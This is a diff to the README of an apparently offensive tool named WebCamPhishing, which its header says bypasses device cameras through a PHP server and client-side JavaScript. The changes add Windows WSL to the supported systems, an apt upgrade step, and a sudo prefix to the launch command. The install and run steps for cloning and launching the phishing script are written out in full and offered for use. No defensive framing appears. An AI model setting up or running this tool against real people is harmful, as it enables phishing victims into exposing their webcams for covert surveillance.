@@ -22,24 +22,31 @@ Bypassing camera on any device using a php server and javascript for client-side
   <li>Mac OS</li>
   <li>Ubuntu</li>
   <li>Arch Linux</li>
+  <li>Windows WSL</li>
   <li>Tails OS</li>
   <li>Parrot Security Linux</li>
 </ul>
 
 # Installing and requirements
+<p>Update and upgrade apt packages</p>
+
+```
+sudo apt update && sudo apt -y upgrade 
+```
+
 <p>This tool require PHP for webserver, SSH or Serveo link. First run following command on your terminal</p>
 
 ```
 sudo apt -y install php openssh git wget unzip
 ```
 
-## Follow the command to use the module:
+## Follow the command to use the module/script:
 
 ```
 git clone https://github.com/jasut1n/WebCamPhishing
 cd WebCamPhishing
 chmod +x webcamphish.sh
-./webcamphish.sh
+sudo ./webcamphish.sh
 ```
 
 ## Change Log:
